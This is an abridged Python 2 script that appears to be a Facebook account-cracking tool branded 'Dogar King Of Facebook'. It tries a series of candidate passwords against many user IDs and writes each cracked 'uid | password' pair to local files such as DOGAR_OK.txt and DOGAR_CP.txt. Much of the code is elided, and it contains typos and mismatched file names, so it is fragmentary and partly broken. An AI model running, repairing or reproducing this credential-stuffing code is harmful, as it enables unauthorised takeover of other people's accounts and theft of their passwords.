...
__author__ = 'BILALDOGAR'
__copyright = 'All rights reserved . Copyright  BILAL DOGAR'
...
def reg():
    ...
    time.sleep(1)
    try:
        to = open('/sdcard/.Bilal.txt', 'r').read()
    ...
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923061206565')
        reg()
...
def menu():
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/.bilal.txt', 'r').read()
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mDogar King Of Facebook\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass1
                cp = open('DOGAR_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass3
                        cp = open('DOGAR_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'loc' in q:
                            ...
                            ok = open('/sdcard/ids/DOGAR_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass4
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'loc' in q:
                                ...
                                print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass5
                                cp = open('DOGAR_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'loc' in q:
                                    ...
                                    print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass6
                                    cp = open('DOGAR_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'loc' in q:
                                        ...
                                        print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass7
                                        cp = open('DOGAR_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'loc' in q:
                                            ...
                                            if 'loc' in q:
                                                ...
                                                print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass9
                                                cp = open('DOGAT_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                if 'loc' in q:
                                                    ...
                                                    print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass10
                                                    cp = open('DOGAR_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mDOGAR King Of Fcebook\x1b[1;91m'
    print 47 * '-'
        ...
        try:
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass2
                    cp = open('DOGAR_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                                ...
                                if 'loc' in q:
                                    ...
                                    if 'loc' in q:
                                        ...
                                        if 'loc' in q:
                                            ...
                                            print '\x1b[1;31;1m[DOGAR-CP] ' + uid + ' | ' + pass8
                                            cp = open('DOGAR_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
